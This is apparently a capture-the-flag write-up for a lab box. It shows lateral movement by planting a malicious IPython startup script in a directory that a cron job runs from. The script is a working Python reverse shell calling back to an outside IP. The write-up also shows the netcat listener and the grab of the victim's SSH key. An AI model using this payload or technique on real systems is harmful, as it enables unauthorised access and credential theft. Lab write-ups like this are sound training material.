Land on the box as user james_mason and checkout ```/home``` to reveal the existence of another user: dan_smith. Since the user.txt file wasn't in james_mason's home directory, it's probably in dan_smith's.
Enumerating permissions reveals that james_mason and dan_smith are both in the "developer" group. This group only has one directory:
```bash
$ find / -group developer -ls 2>/dev/null
    46286      4 drwxrwx---   2 root     developer     4096 Oct 22 13:49 /opt/scripts_review
```
Using a tool to monitor processes being executed on the box like pspy, I noticed there appears to be a cron where dan_smith's user navigates to the diretory mentioned above and executes a binary (UID=1001 is the dan_smith user):
```bash
2022/10/22 16:07:01 CMD: UID=1001 PID=6370   | /bin/sh -c /usr/bin/pkill ipython; cd /opt/scripts_review/ && /usr/local/bin/ipython 
2022/10/22 16:07:01 CMD: UID=1001 PID=6371   | /usr/bin/pkill ipython 
2022/10/22 16:07:01 CMD: UID=1001 PID=6372   | /usr/bin/python3 /usr/local/bin/ipython
```
Ok it's just executing ipython, not an ipython script. That's a bit weird...
After doing a bit of googling, find something that looks interesting: ```https://github.com/advisories/GHSA-pq7m-3gw7-gq5x```
![[Pasted image 20221022150928.png]]
Well, that was easy...
Time to craft a malicious python file and reproduce the steps mentioned above
```python
# the malicous python file
import socket,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.4",9001))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/sh")
```
Now, just follow the steps from the GitHub issue but sub the directory and file names:
```bash
james_mason@shared:/dev/shm$ mkdir -m 777 /opt/scripts_review/profile_default
james_mason@shared:/dev/shm$ mkdir -m 777 /opt/scripts_review/profile_default/startup
james_mason@shared:/dev/shm$ nano /opt/scripts_review/profile_default/startup/pwn.py
```
Listen for the connection back:
```bash
$ nc -lvnp 9001                                                                                                                                         1 ⨯
listening on [any] 9001 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.11.172] 45336
$ id
uid=1001(dan_smith) gid=1002(dan_smith) groups=1002(dan_smith),1001(developer),1003(sysadmin)
```
This shell will die quickly so navigate to dan_smith's home directory and grab the ssh key before the cron job kills the process.